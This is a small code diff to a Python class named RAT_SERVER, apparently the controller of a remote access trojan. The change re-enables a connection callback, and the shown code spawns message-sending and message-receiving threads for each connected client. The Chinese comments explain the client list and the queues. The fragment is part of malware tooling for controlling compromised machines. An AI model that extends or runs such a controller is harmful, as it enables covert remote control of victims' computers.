@@ -30,7 +30,7 @@ class RAT_SERVER:
         print(f"[*] Connection is established successfully with {ipcli}")
         # 将客户端的连接信息添加到self.clients列表中，包括客户端socket对象、地址、两个队列用于发送和接收消息
         self.clients.append((client, *addr, Queue(), Queue()))
-        # self.on_client_connected(*addr)
+        self.on_client_connected(*addr)
         # 创建两个线程，一个用于发送消息，一个用于接收消息
         send_thread = threading.Thread(target=self.send_msg, args=(self.clients[-1][3], client))
         recv_thread = threading.Thread(target=self.recv_msg, args=(self.clients[-1][4], client))
